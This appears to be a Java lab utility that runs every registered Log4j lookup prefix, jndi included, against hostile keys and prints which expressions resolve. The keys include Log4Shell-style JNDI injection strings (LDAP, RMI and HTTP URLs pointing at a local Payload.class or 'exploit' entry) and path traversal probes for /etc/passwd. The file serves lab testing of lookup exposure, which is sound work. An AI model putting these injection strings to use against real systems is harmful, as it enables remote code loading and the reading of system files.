package lab;

import java.util.Arrays;
import java.util.List;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.lookup.StrSubstitutor;

/**
 * Sweeps every lookup the current release registers with hostile keys.
 * Shows which lookups can be reached and what they yield, from one place.
 */
public final class LookupSweep {

    private static final List<String> PREFIXES = Arrays.asList(
            "env", "sys", "ctx", "sd", "event", "java", "log4j", "main", "marker",
            "date", "lower", "upper", "jndi", "bundle", "properties", "jvmrunargs",
            "base64", "docker", "k8s", "spring", "web", "map");

    private static final List<String> KEYS = Arrays.asList(
            "ldap://127.0.0.1:1389/cn=exploit,dc=example,dc=com",
            "rmi://127.0.0.1:1099/exploit",
            "http://127.0.0.1:8000/lab/Payload.class",
            "file:///etc/passwd",
            "/etc/passwd",
            "../../../../etc/passwd",
            "HOME",
            "user.name",
            "configLocation",
            "x");

    public static void main(final String[] args) {
        final LoggerContext ctx = LoggerContext.getContext(false);
        final Configuration config = ctx.getConfiguration();
        final StrSubstitutor substitutor = config.getStrSubstitutor();
        System.out.println("== lookup sweep");
        for (final String prefix : PREFIXES) {
            for (final String key : KEYS) {
                final String expr = "${" + prefix + ":" + key + "}";
                String out;
                try {
                    out = substitutor.replace(expr);
                } catch (final Throwable t) {
                    out = "EXCEPTION " + t.getClass().getSimpleName() + ": " + t.getMessage();
                }
                if (out != null && !out.equals(expr)) {
                    final String shown = out.length() > 160 ? out.substring(0, 160) + "..." : out;
                    System.out.println("RESOLVED  ${" + prefix + ":" + key + "}  ->  " + shown);
                }
            }
        }
        System.out.println("sweep done");
    }

    private LookupSweep() {}
}
